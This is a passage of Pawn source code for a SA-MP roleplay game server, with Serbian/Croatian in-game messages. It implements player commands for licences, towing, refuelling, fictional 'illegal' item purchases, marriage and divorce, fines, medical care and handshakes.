		DajIgracuNovac( playerid, -8000 ); PolaganjeBodovi[ playerid ] = 0;
		SPD( playerid, dialog_C3_ISPIT, DSMSG, ""col_white"Pitanje br. 1", ""col_white"Kojom stranom se vozi u Los Santosu?", "Levom", "Desnom");
	}
	else {
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/kupidozvolu [kategorija]");
     	SCM( playerid, BELA, "[Kategorije] A(motor), B(auto), C1(Kombi), C2(Kamion), C3(Kamion sa prikolicom)");
        SCM( playerid, BELA, "[Cene] A(1000$), B(3000$), C1(4500$), C2(6000$), C3(8000$)");
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
	}
	return 1;
}

CMD:tow( playerid, params[] ) {
    if( IsPlayerInAnyVehicle( playerid )) {
    	if(GetVehicleModel(GetPlayerVehicleID( playerid )) == 525) {
 	   	    if(GetPlayerState( playerid ) == 2) {
				new Float:pX,Float:pY,Float:pZ;
				GetPlayerPos( playerid,pX,pY,pZ);
				new Float:vX,Float:vY,Float:vZ;
				new Found = 0;
				new vid = 0;
				while((vid<MAX_VEHICLES)&&(!Found)) {
	   				vid++;
	   				GetVehiclePos(vid,vX,vY,vZ);
	   				if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0)&&(floatabs(pZ-vZ)<7.0)&&(vid!=GetPlayerVehicleID( playerid ))) {
    					Found=1;
	   				   	if( IsTrailerAttachedToVehicle( GetPlayerVehicleID( playerid ) ) )
	   			        	DetachTrailerFromVehicle( GetPlayerVehicleID( playerid ) );
				       	else
	    					Novi_AttachTrailerToVehicle( vid, GetPlayerVehicleID( playerid ) );
	 				}
    			}
				if(!Found)
   					SendErrorMessage( playerid, "Nema automobila okolo.");
			} else SCM( playerid, CRVENA, "Moras biti vozac!");
		} else SCM( playerid, CRVENA, "Moras biti u Tow Trucku da bi koristio ovo!");
	} else SCM( playerid, CRVENA, "Moras biti u vozilu da bi koristio ovo!");
	return 1;
}

CMD:illegal( playerid, params[] ) {
    new broj;
	if( !IsPlayerInRangeOfPoint( playerid, 3.0, 1714.9465, -1508.9261, 13.7345 ) ) return SendErrorMessage( playerid, "Morate biti u SHTEK NS.");
	if( sscanf(params, "d", broj ) ) {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/illegal [ broj predmeta ]");
		SCM( playerid, BELA, "[Broj predmeta]: 1. Inekcija 2. Alat za obijanje.");
		SCM( playerid, BELA, "[Cena]: Inekcija( 100$ ) Alat za obijanje( 500$ ).");
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if( broj == 1 ) {
		if( PlayerInfo[ playerid ][ xInekcija ] == false ) {
		    if( PlayerInfo[ playerid ][ xNovac ] < 100 ) return SendErrorMessage( playerid, "Nemas dovoljno novca." );
			SendInfoMessage( playerid, "Kupio si inekciju za 100$." );
			PlayerInfo[ playerid ][ xInekcija ] = true;
			DajIgracuNovac( playerid, -100 );
		}
		else SendErrorMessage( playerid, "Vec imas spric i iglu!");
	}
	else if( broj == 2 ) {
		if( PlayerInfo[ playerid ][ xToolkit ] == false ) {
		    if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, "Nemas dovoljno novca." );
			SendInfoMessage( playerid, "Kupio si alat za obijanje za 500$." );
			PlayerInfo[ playerid ][ xToolkit ] = true;
			DajIgracuNovac( playerid, -500 );
		}
		else SendErrorMessage( playerid, "Vec imas alat za obijanje!");
	}
	else return SendErrorMessage( playerid, "Pogresan broj 1-2." );
	return 1;
}

CMD:fill( playerid, params[] ) {
	new fuel;
	new vehicleid = GetPlayerVehicleID( playerid );
	if( !IsAtGasStation( playerid ) ) {
 		SendErrorMessage( playerid, "Niste na benzinskoj stanici!");
	    return 1;
	}
	if( IsVehicleBajs( vehicleid ) ) {
		SendErrorMessage( playerid, "Ne mozete bicikl napuniti gorivom.");
		return 1;
	}
	if( sscanf( params, "i", fuel ) ) {
		SendUsageMessage( playerid, "/fill [litara(1-100)]" );
		return 1;
	}
	if( (fuel+Fuel[ vehicleid ]) > getAmountFuel( vehicleid ) ) {
 		SendErrorMessage( playerid, "Ne moze toliko goriva stati u vas automobil.");
		return 1;
	}
	if( fuel > ServerInfo[ Gorivo ] ) {
	    SendErrorMessage( playerid, "Nema toliko goriva u resursima.");
	    return 1;
	}
	if( fuel < 1 ) {
 		SendUsageMessage( playerid, "/fill [Kolicina]");
		return 1;
	}
	if( PuniGorivo[ playerid ] == true ) return SendErrorMessage( playerid, "Vec punis gorivo." );
	if( Eurosuper95( GetPlayerVehicleID( playerid ) ) ) {
		if( PlayerInfo[ playerid ][ xNovac ] < fuel*30 ) return SendErrorMessage(playerid, "Nemate dovoljno novca, 1 litar kosta 30$");
	}
	else if( Super95( GetPlayerVehicleID( playerid ) ) ) {
		if( PlayerInfo[ playerid ][ xNovac ] < fuel*24 ) return SendErrorMessage(playerid, "Nemate dovoljno novca, 1 litar kosta 24$");
	}
	else if( Super98( GetPlayerVehicleID( playerid ) ) ) {
		if( PlayerInfo[ playerid ][ xNovac ] < fuel*20 ) return SendErrorMessage(playerid, "Nemate dovoljno novca, 1 litar kosta 20$");
	}
	else if( Eurodizel( GetPlayerVehicleID( playerid ) ) ) {
		if( PlayerInfo[ playerid ][ xNovac ] < fuel*20 ) return SendErrorMessage(playerid, "Nemate dovoljno novca, 1 litar kosta 20$");
	}
	else if( Dizel( GetPlayerVehicleID( playerid ) ) ) {
		if( PlayerInfo[ playerid ][ xNovac ] < fuel*24 ) return SendErrorMessage(playerid, "Nemate dovoljno novca, 1 litar kosta 24$");
	}
	else if( LozUlje( GetPlayerVehicleID( playerid ) ) ) {
		if( PlayerInfo[ playerid ][ xNovac ] < fuel*30 ) return SendErrorMessage(playerid, "Nemate dovoljno novca, 1 litar kosta 30$");
	}
	else if( Plin( GetPlayerVehicleID( playerid ) ) ) {
		if( PlayerInfo[ playerid ][ xNovac ] < fuel*20 ) return SendErrorMessage(playerid, "Nemate dovoljno novca, 1 litar kosta 20$");
	}
	
	GameTextForPlayer( playerid,"~w~~n~~n~~n~~n~~n~~n~~n~~n~~n~Nadopunjujem gorivo, molim sacekajte",2000,3);
	SetTimerEx("Fillup", 10000, 0, "ii", playerid, fuel );
    TogglePlayerControllable( playerid, false );
    PuniGorivo[ playerid ] = true;
	return 1;
}
CMD:odustani( playerid, params[]) {
	new x_job[32];
	sscanf(params, "s[32]", x_job);
	if(!strlen(x_job)) {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/odustani [opcija]");
     	SCM( playerid, BELA, "[Opcije] popravimotor, popraviokvir, popravigume, alarm, immob, brava, neon");
     	SCM( playerid, BELA, "[Opcije] color, refill, ticket");
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if(strcmp(x_job,"popravimotor",true) == 0) { SetPVarInt( playerid, "RepairEOffer", 999); SetPVarInt( playerid, "RepairEPrice", 0); }
	else if(strcmp(x_job,"popraviokvir",true) == 0) { SetPVarInt( playerid, "RepairBKOffer", 999); SetPVarInt( playerid, "RepairBKPrice", 0);}
	else if(strcmp(x_job,"popravigume",true) == 0) { SetPVarInt( playerid, "RepairTOffer", 999); SetPVarInt( playerid, "RepairTPrice", 0); }
	else if(strcmp(x_job,"alarm",true) == 0) { SetPVarInt( playerid, "RepairAOffer", 999); SetPVarInt( playerid, "RepairAPrice", 0); SetPVarInt( playerid, "RepairAvID", -1); SetPVarInt( playerid, "RepairADelovi", 0); }
	else if(strcmp(x_job,"immob",true) == 0) { SetPVarInt( playerid, "RepairIOffer", 999); SetPVarInt( playerid, "RepairIPrice", 0); SetPVarInt( playerid, "RepairIvID", -1); SetPVarInt( playerid, "RepairIDelovi", 0); }
	else if(strcmp(x_job,"brava",true) == 0) { SetPVarInt( playerid, "RepairLOffer", 999); SetPVarInt( playerid, "RepairLPrice", 0); SetPVarInt( playerid, "RepairLvID", -1); SetPVarInt( playerid, "RepairLDelovi", 0); }
	else if(strcmp(x_job,"neon",true) == 0) { SetPVarInt( playerid, "RepairNOffer", 999); SetPVarInt( playerid, "RepairNPrice", 0); SetPVarInt( playerid, "RepairNvID", -1); SetPVarInt( playerid, "RepairNNeon", 0); }
	else if(strcmp(x_job,"color",true) == 0) { SetPVarInt( playerid, "ResprayOffer", 999); SetPVarInt( playerid, "ResprayPrice", 0 ); SetPVarInt( playerid, "ResprayvID", -1 ); }
	else if(strcmp(x_job,"refill",true) == 0) { SetPVarInt( playerid, "RefillOffer", 999); SetPVarInt( playerid, "RefillPrice", 0); SetPVarInt( playerid, "RefillAmount", 0); }
    else if(strcmp(x_job,"ticket",true) == 0) { SetPVarInt( playerid, "TicketOffer", 999); SetPVarInt( playerid, "TicketMoney", 0); }
    else if(strcmp(x_job,"medicine",true) == 0) { SetPVarInt( playerid, "MedicineOffer", 999); SetPVarInt( playerid, "MedicineMoney", 0 ); }
    else if(strcmp(x_job,"recover",true) == 0) { SetPVarInt( playerid, "RecoverOffer", 999); SetPVarInt( playerid, "RecoverMoney", 0 ); }
	else { return 1; }
	SendClientMessageEx( playerid, SVETLOPLAVA, "* Otkazali ste uslugu: %s.", x_job);
	return 1;
}
CMD:prihvati( playerid, params[] ) {
	new item[32];
	if( sscanf( params, "s[32] ", item)) {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/prihvati [opcija]");
     	SCM( playerid, BELA, "[Opcije] color, refill, recover, medicine");
     	SCM( playerid, BELA, "[Opcije] live, rukovanje, frisk");
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	
	if( strcmp( item, "witness",true) == 0) {
		if( MarryWitnessOffer[ playerid ] < 999 ) {
			if( IsPlayerConnected( MarryWitnessOffer[ playerid ] ) ) {
				if( IsPlayerNearPlayer( 10.0, playerid, MarryWitnessOffer[ playerid ] ) ) {
					format( globalstring, sizeof( globalstring ), "* Prihvatili ste ponudu osobe %s da budete svedok na vencanju.", ImeIgraca( MarryWitnessOffer[ playerid ] ) );
					SCM( playerid, SVETLOPLAVA, globalstring );
					format( globalstring, sizeof( globalstring ), "* %s je prihvatio vasu ponudu da bude svedok na vasem vencanju.", ImeIgraca( playerid ) );
					SCM( MarryWitnessOffer[ playerid ], SVETLOPLAVA, globalstring );
					MarryWitness[ MarryWitnessOffer[ playerid ] ] = playerid;
					MarryWitnessOffer[ playerid ] = 999;
				}
				else SendErrorMessage( playerid, "Osoba se ne nalazi u vasoj blizini!");
			}
		}
		else SendErrorMessage( playerid, "Niko nije zatvrazio da budete svedok na vencanju!");
	}
	else if( strcmp( item, "marriage",true) == 0) {
		if( ProposeOffer[ playerid ] < 999 ) {
			if( !IsPlayerInRangeOfPoint( playerid, 10.0, 725.3050, -1597.1079, 3.4530 ) ) return SendErrorMessage( playerid, "Ne nalazite se na mestu za vencanje." );
			if( IsPlayerConnected( ProposeOffer[ playerid ] ) ) {
				if( IsPlayerNearPlayer( 10.0, playerid, ProposeOffer[ playerid ] ) ) {
					if( MarryWitness[ ProposeOffer[ playerid ] ] == 999 ) return SendErrorMessage( playerid, "Isprosilac nema svedoka za vencanje." );
					if( IsPlayerConnected( MarryWitness[ ProposeOffer[ playerid ] ] ) ) {
						if( IsPlayerNearPlayer( 12.0, ProposeOffer[ playerid ], MarryWitness[ ProposeOffer[ playerid ] ] ) ) {
							format( globalstring, sizeof( globalstring ), "* Prihvatili ste ponudu osobe %s da bude vas muz.", ImeIgraca( ProposeOffer[ playerid ] ) );
							SCM( playerid, SVETLOPLAVA, globalstring );
							format( globalstring, sizeof( globalstring ), "* %s je prihvatila ponudu da bude vasa supruga.", ImeIgraca( playerid ) );
							SCM( ProposeOffer[ playerid ], SVETLOPLAVA, globalstring );
							format( globalstring, sizeof( globalstring ), "Maticar: %s da li vi uzimate %s za vaseg voljenog muza? (Koristite 'da', ukoliko pristajete!)", ImeIgraca( playerid ), ImeIgraca( ProposeOffer[ playerid ] ) );
							SCM( playerid, BELA, globalstring );
							MarriageCeremoney{ playerid } = 1;
							ProposedTo[ ProposeOffer[ playerid ] ] = playerid;
							GotProposedBy[ playerid ] = ProposeOffer[ playerid ];
							MarryWitness[ ProposeOffer[ playerid ] ] = 999;
							ProposeOffer[ playerid ] = 999;
						}
						else SendErrorMessage( playerid, "Svedok vencanja nije u blizini vaseg buduceg supruga.");
					}
				}
				else SendErrorMessage( playerid, "Osoba se ne nalazi u vasoj blizini!" );
			}
		}
		else SendErrorMessage( playerid, "Niko vas nije zaprosio." );
	}
	else if( strcmp( item, "divorce", true ) == 0 ) {
		if( DivorceOffer[ playerid ] < 999 ) {
			if( IsPlayerConnected( DivorceOffer[ playerid ] ) ) {
				if( IsPlayerNearPlayer( 10.0, playerid, DivorceOffer[ playerid ] ) ) {
					format( globalstring, sizeof( globalstring ), "* Prihvatili ste poziv %s da budete svedok razvoda.", ImeIgraca( DivorceOffer[ playerid ] ) );
					SCM( playerid, SVETLOPLAVA, globalstring );
					format( globalstring, sizeof( globalstring ), "* %s je prihvatio da bude svedok razvoda.", ImeIgraca( playerid ) );
					SCM( DivorceOffer[ playerid ], SVETLOPLAVA, globalstring );
					strmid( PlayerInfo[ playerid ][ xMarriedTo ], "Niko", 0, strlen( "Niko" ), 24 );
					PlayerInfo[ playerid ][ xMarried ] = false;
					strmid( PlayerInfo[ DivorceOffer[ playerid ] ][ xMarriedTo ], "Niko", 0, strlen( "Niko" ), 24 );
					PlayerInfo[ DivorceOffer[ playerid ]][ xMarried ] = false;
					ProposeOffer[ playerid ] = 999;
				} else SendErrorMessage( playerid, "Osoba koja vam je poslala formulare nije u vasoj blizini!");
			}
		} else SendErrorMessage( playerid, "Niko vam nije poslao formulare!");
	}
	else if( strcmp( item, "ticket",true) == 0) {
	    new pandur = GetPVarInt( playerid, "TicketOffer");
	    if( GetPVarInt( playerid, "TicketOffer") < 999 ) {
	        if( IsPlayerConnected( pandur ) ) {
	            if( IsPlayerNearPlayer( 5.0, playerid, pandur ) ) {
				    if( PlayerInfo[ playerid ][ xNovac ] >= GetPVarInt( playerid, "TicketMoney" ) ) {
						SendClientMessageEx( playerid, SVETLOPLAVA, "* Platili ste kaznu u iznosu od $%d policajcu %s.", GetPVarInt( playerid, "TicketMoney"), ImeIgraca( pandur ) );
						SendClientMessageEx( pandur, SVETLOPLAVA, "* %s je platio vasu kaznu $%d koja ide u sef policije.", ImeIgraca( playerid ), GetPVarInt( playerid, "TicketMoney") );
						DajIgracuNovac( playerid, - GetPVarInt( playerid, "TicketMoney") );
						DajIgracuNovac( pandur, GetPVarInt( playerid, "TicketMoney") );
						PlayerInfo[ pandur ][ xPDStatsTicket ] += 1;
						PlayerInfo[ pandur ][ xPDStatsTicketMoney ] += GetPVarInt( playerid, "TicketMoney");
						SetPVarInt( playerid, "TicketOffer", 999 );
						SetPVarInt( playerid, "TicketMoney", 0 );
					} else SendErrorMessage( playerid, "Nemas dovoljno novca !");
				} else SCM( playerid, CRVENA, "Policajac nije dovoljno blizu vas !");
	        }
		} else SendErrorMessage( playerid, "Nitko vam nije dao tiket !");
	}
	else if( strcmp( item,"recover",true) == 0) {
	    if( GetPVarInt(playerid, "RecoverOffer") < 999 ) {
	        if( IsPlayerConnected( GetPVarInt(playerid, "RecoverOffer") ) ) {
	            if( IsPlayerNearPlayer( 5.0, playerid, GetPVarInt(playerid, "RecoverOffer") ) ) {
				    if( PlayerInfo[ playerid ][ xNovac ] >= GetPVarInt(playerid, "RecoverMoney")) {
						format( globalstring, sizeof( globalstring ), "* Platio si $%d za troskove lecenja doktoru %s.", GetPVarInt(playerid, "RecoverMoney"), ImeIgraca( GetPVarInt(playerid, "RecoverOffer") ) );
						SCM( playerid, SVETLOPLAVA, globalstring);
						format( globalstring, sizeof( globalstring ), "* %s je platio troskove lecenja u iznosu od $%d koji idu u sef bolnice.", ImeIgraca( playerid ), GetPVarInt(playerid, "RecoverMoney"));
						SCM( GetPVarInt(playerid, "RecoverOffer"), SVETLOPLAVA, globalstring);
						DajIgracuNovac( playerid, - GetPVarInt(playerid, "RecoverMoney"));
						DajIgracuNovac( GetPVarInt(playerid, "RecoverOffer"), GetPVarInt(playerid, "RecoverMoney" ) );
						SetPVarInt( playerid, "RecoverOffer", 999 );
						SetPVarInt( playerid, "RecoverMoney", 0 );
						Novi_SetPlayerHealth( playerid, 150 );
			    	    TogglePlayerControllable( playerid, true );
		    			PlayerInfo[ playerid ][ xUbijen ] = 0;
					} else SendErrorMessage( playerid, "Nemas toliko novaca!");
				} else SendErrorMessage( playerid, "Doktor nije blizu tebe !");
	        }
		} else SendErrorMessage( playerid, "Niko ti nije ponudio lecenje !");
	}
	else if( strcmp( item,"medicine",true) == 0) {
	    if( GetPVarInt(playerid, "MedicineOffer") < 999) {
	        if( IsPlayerConnected(GetPVarInt(playerid, "MedicineOffer"))) {
                if( IsPlayerNearPlayer( 8.0, playerid, GetPVarInt(playerid, "MedicineOffer") ) ) {
                	if( PlayerInfo[ playerid ][ xNovac ] >= GetPVarInt(playerid, "MedicineMoney")) {
					   	format( globalstring, sizeof( globalstring ), "* Prihvatili ste lek od Doktora %s i sada imate 100hp-a.", ImeIgraca( GetPVarInt(playerid, "MedicineOffer") ) );
					   	SCM( playerid, SVETLOPLAVA, globalstring );
		   				format( globalstring, sizeof( globalstring ), "* %s je prihvatio vas lek i zaradili ste $%d koji idu u sef bolnice.", ImeIgraca( playerid ), GetPVarInt(playerid, "MedicineMoney") );
					   	SCM( GetPVarInt(playerid, "MedicineOffer"), SVETLOPLAVA, globalstring );
					   	DajIgracuNovac( playerid, - GetPVarInt(playerid, "MedicineMoney"));
                        DajIgracuNovac( GetPVarInt(playerid, "MedicineOffer"), GetPVarInt(playerid, "MedicineMoney" ));
					    Novi_SetPlayerHealth( playerid, 150 );
			            SetPVarInt( playerid, "MedicineOffer", 999);
			            SetPVarInt( playerid, "MedicineMoney", 0);
		           	} else SendErrorMessage( playerid, "Nemas toliko novaca! !");
                } else SendErrorMessage( playerid, "Taj igrac nije u blizini vas !");
			}
	    } else SendErrorMessage( playerid, "Niko vam nije ponudio lek !");
	}
	else if( strcmp( item,"live",true) == 0) {
	    if( GetPVarInt( playerid, "LiveOffer" ) < 999 ) {
	        if( IsPlayerConnected( GetPVarInt( playerid, "LiveOffer" ) ) ) {
		        if( IsPlayerNearPlayer( 5.0, playerid, GetPVarInt( playerid, "LiveOffer" ) ) ) {
				    SendClientMessage( playerid, 0x33CCFFAA, "* Zamrznuti ste dok razgovor uzivo nezavrsi.");
					SendClientMessage( GetPVarInt(playerid, "LiveOffer"), 0x33CCFFAA, "* Zamrznuti ste dok razgovor uzivo ne zavrsi (koristite /live da zavrsite).");
					TogglePlayerControllable( playerid, false );
					TogglePlayerControllable( GetPVarInt( playerid, "LiveOffer" ), 0 );
					SetPVarInt( playerid, "TalkingLive", GetPVarInt( playerid, "LiveOffer" ) );
	                SetPVarInt( GetPVarInt( playerid, "LiveOffer"), "TalkingLive", playerid );
					SetPVarInt( playerid, "LiveOffer", 999 );
				} else SendErrorMessage( playerid, "Predaleko ste od Novinara !");
			}
		} else SendErrorMessage( playerid, "Nitko vam nije ponudio razgovor uzivo !");
	}
	else if( strcmp( item, "rukovanje", true ) == 0 ) {
	    if( GetPVarInt( playerid, "ShakeOffer" ) < 999 ) {
	        if( IsPlayerConnected( GetPVarInt( playerid, "ShakeOffer" ) ) ) {
	            if( IsPlayerNearPlayer( 3.0, playerid, GetPVarInt( playerid, "ShakeOffer" ) ) ) {
	                switch( GetPVarInt( playerid, "ShakeStyle" ) )
				    {
				        case 1:
				        {
                            ApplyAnimation(playerid,"GANGS","hndshkfa_swt",4.0,0,0,0,0,0, 1);
							ApplyAnimation(GetPVarInt(playerid, "ShakeOffer"),"GANGS","hndshkfa_swt",4.0,0,0,0,0,0, 1);
						}
						case 2:
						{
                            ApplyAnimation(playerid,"GANGS","hndshkaa",4.0,0,0,0,0,0, 1);
							ApplyAnimation(GetPVarInt(playerid, "ShakeOffer"),"GANGS","hndshkaa",4.0,0,0,0,0,0, 1);
						}
						case 3:
						{
                            ApplyAnimation(playerid,"GANGS","hndshkba",4.0,0,0,0,0,0, 1);
							ApplyAnimation(GetPVarInt(playerid, "ShakeOffer"),"GANGS","hndshkba",4.0,0,0,0,0,0, 1);
						}
						case 4:
						{
                            ApplyAnimation(playerid,"GANGS","hndshkca",4.0,0,0,0,0,0, 1);
							ApplyAnimation(GetPVarInt(playerid, "ShakeOffer"),"GANGS","hndshkca",4.0,0,0,0,0,0, 1);
						}
						case 5:
						{
                            ApplyAnimation(playerid,"GANGS","hndshkda",4.0,0,0,0,0,0, 1);
							ApplyAnimation(GetPVarInt(playerid, "ShakeOffer"),"GANGS","hndshkda",4.0,0,0,0,0,0, 1);
						}
						case 6:
						{
                            ApplyAnimation(playerid,"GANGS","hndshkea",4.0,0,0,0,0,0, 1);
							ApplyAnimation(GetPVarInt(playerid, "ShakeOffer"),"GANGS","hndshkea",4.0,0,0,0,0,0, 1);
						}
						case 7:
						{
                            ApplyAnimation(playerid,"GANGS","hndshkfa",4.0,0,0,0,0,0, 1);
							ApplyAnimation(GetPVarInt(playerid, "ShakeOffer"),"GANGS","hndshkfa",4.0,0,0,0,0,0, 1);
						}
						case 8:
						{
                            ApplyAnimation(playerid,"GANGS","prtial_hndshk_01",4.0,0,0,0,0,0, 1);
							ApplyAnimation(GetPVarInt(playerid, "ShakeOffer"),"GANGS","prtial_hndshk_01",4.0,0,0,0,0,0, 1);
						}
						case 9:
						{
                            ApplyAnimation(playerid,"GANGS","prtial_hndshk_biz_01",4.0,0,0,0,0,0, 1);
							ApplyAnimation(GetPVarInt(playerid, "ShakeOffer"),"GANGS","prtial_hndshk_biz_01",4.0,0,0,0,0,0, 1);
						}
					}
					format( globalstring, sizeof( globalstring ), "* Prihvatio si %s-ov zahtev za rukovanje.", ImeIgraca( GetPVarInt( playerid, "ShakeOffer" ) ) );
					SendClientMessage( playerid, SVETLOPLAVA, globalstring );
					format( globalstring, sizeof( globalstring ), "* %s je prihvatio tvoj zahtev za rukovanjem.", ImeIgraca( playerid ) );
					SendClientMessage( GetPVarInt( playerid, "ShakeOffer" ), SVETLOPLAVA, globalstring );
					SetPVarInt( playerid, "ShakeOffer", 0 );
					SetPVarInt( GetPVarInt(playerid, "ShakeOffer" ), "ShakeOffer", 0 );
				} else SendErrorMessage( playerid, "Igrac koji ti je ponudio rukovanje nije blizu tebe !");
	        }
		} else SendErrorMessage( playerid, "Nitko ti nije ponudio rukovanje !");
	}
	else {
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/prihvati [opcija]");
     	SCM( playerid, BELA, "[Opcije] popravimotor, popraviokvir, popravigume, alarm, immob, brava, neon");
     	SCM( playerid, BELA, "[Opcije] color, refill, recover, medicine");
     	SCM( playerid, BELA, "[Opcije] live, rukovanje, frisk");
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
	}
	return 1;
}
CMD:otkaz( playerid, params[]) {
	if( PlayerInfo[ playerid ][ xPosao ] == 0 ) return SendErrorMessage( playerid, "Vi nemate nijedan posao." );
	if( PlayerInfo[ playerid ][ xUgovor ] >= 3 || PlayerInfo[playerid][xAdmin] >= 5)  {
		SCM( playerid, SVETLOPLAVA, "* Ispunili ste 3 sati ugovora, i dali ste otkaz na poslu.");
		PlayerInfo[ playerid ][ xPosao ] = 0;
		PlayerInfo[ playerid ][ xUgovor ] = 0;
        PlayerInfo[playerid][xJobSkill] = 0;
        PlayerInfo[playerid][xDeliveryBroj] = 0;
		UzeoOpremu[ playerid ] = false;
	    PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
		
	} else {
		new chours = 3 - PlayerInfo[ playerid ][ xUgovor ];
		SendClientMessageEx( playerid, SVETLOPLAVA, "* Jos imate %d sati rada da bi ste ispunili svoj ugovor i dali otkaz.", chours);
	}
	return 1;
}

// CMD:stoptaxi( playerid, params[] ) {
// 	if( offeredByCabbie[ playerid ] != INVALID_PLAYER_ID ) {
// 	    new vehicleid = GetPlayerVehicleID( playerid );
// 	    if( GetFactionType( offeredByCabbie[ playerid ] ) != ORG_TIP_TAXI ) return SendErrorMessage( playerid, "Ne vozis se taksijem." );
// 		if( TaximetarUkljucen[ offeredByCabbie[ playerid ] ] == false ) return SendErrorMessage( playerid, "Taximetar nije ukljucen!");
// 		if( GetPlayerVehicleID( playerid ) != GetPlayerVehicleID( offeredByCabbie[ playerid ] ) ) return SendErrorMessage( playerid, "Nisi u vozilu sa taxistom!");
//         if( TipVozila[ vehicleid ] == ORGANIZACIJSKO_VOZILO && OrgaVozila[ vehicleid ] == PlayerInfo[ offeredByCabbie[ playerid ] ][ xClan ] ) {
// 			TaximetarUkljucen[ offeredByCabbie[ playerid ] ] = false;

// 			PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 0 ] );
// 			PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 1 ] );
// 			PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 2 ] );
// 			PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 3 ] );
// 			PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 4 ] );
// 			PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 5 ] );
// 			PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 6 ] );
// 			PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 7 ] );

// 			DajIgracuNovac( playerid, -CenaVoznje[ offeredByCabbie[ playerid ] ] );
// 			DajIgracuNovac( offeredByCabbie[ playerid ], CenaVoznje[ offeredByCabbie[ playerid ] ] );

// 			SendClientMessageEx( playerid, ZUTA, "Stigli ste do lokacije i platili %d$ za voznju", CenaVoznje[ offeredByCabbie[ playerid ] ] );
// 			SendClientMessageEx( offeredByCabbie[ playerid ], ZUTA, "Stigli ste do lokacije na koju je igrac htio i naplatili %d$ za voznju", CenaVoznje[ offeredByCabbie[ playerid ] ] );

// 			PlayerTextDrawSetString( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 6 ], "N/A" );
// 			PlayerTextDrawShow( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 6 ] );
// 			PlayerTextDrawSetString( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 7 ], "N/A" );
// 			PlayerTextDrawShow( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 7 ] );

// 			CenaVoznje[ offeredByCabbie[ playerid ] ] = 0;
// 			Novi_KillTimer( TaxiTimer[ offeredByCabbie[ playerid ] ] );
// 			VoziIgracaID[ offeredByCabbie[ playerid ] ] = INVALID_PLAYER_ID;
// 			offeredByCabbie[ playerid ] = INVALID_PLAYER_ID;
// 		} else SendErrorMessage( playerid, "Niste u taxi vozilu!");
// 	}
// 	else return SendErrorMessage( playerid, "Nisi prihvatio voznju taksijem!");
// 	return 1;
// }

// CMD:taxi( playerid, params[] ) {
//     if( GetFactionType( playerid ) != ORG_TIP_TAXI ) return SendErrorMessage( playerid, "Ovu komandu moze koristiti samo Taksista." );
// 	new item[32], izbor, vehicleid = GetPlayerVehicleID( playerid );
// 	if( sscanf( params, "s[32] ", item)) {
// 		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
// 		SendUsageMessage( playerid, "/taxi [ opcija ]");
//      	SCM( playerid, BELA, "[Opcije] duty, ponudivoznju, uzmiklijenta");
// 		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
// 		return 1;
// 	}
// 	if( strcmp( item, "duty",true) == 0) {
// 	    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 312.5584,1498.3406,-16.5524 ) ) return SendErrorMessage( playerid, "Morate biti u Taxi uredu da bi obukli/skinuli uniformu i otisli na duznost." );
// 	    if( taxiDuty[ playerid ] == false ) {
// 	        PostaviSkin( playerid, 255 );
  			
// 	        taxiDuty[ playerid ] = true;
// 	        SendJobMessage( playerid, "Obukao si uniformu taksiste i sada si na duznosti." );
// 	        format( globalstring, sizeof( globalstring ), "{FBE600}Taxista "col_white"%s {FBE600}je na duznosti. Kucajte "col_white"/call 777{FBE600} da ga pozovete.", ImeIgraca( playerid ) );
// 			SCMA( -1, globalstring );
// 		}
// 	    else if( taxiDuty[ playerid ] == true ) {
// 	        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
  			
// 	        taxiDuty[ playerid ] = false;
// 	        SendJobMessage( playerid, "Skinuo si uniformu taksiste i vise nisi na duznosti." );
// 	    }
// 	    return 1;
// 	}
// 	else if( strcmp( item, "ponudivoznju",true) == 0) {
// 	    if( sscanf( params, "s[32]u", item, izbor ) ) {
// 			SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
// 			SendUsageMessage( playerid, "/taxi ponudivoznju [ ID/Deo imena ] ");
// 			SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
// 			return 1;
// 		}
// 		if( playerid == izbor ) return SendErrorMessage( playerid, "Ne mozes voziti sam sebe!");
// 		if( izbor == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );
//         if( taxiDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Morate biti na duznosti." );
// 		if( VoziIgracaID[ playerid ] != INVALID_PLAYER_ID ) return SendErrorMessage( playerid, "Vec vozis nekog!");
// 		if( GetPlayerVehicleID( playerid ) != GetPlayerVehicleID( izbor ) ) return SendErrorMessage( playerid, "Igrac mora biti u vasem vozilu");
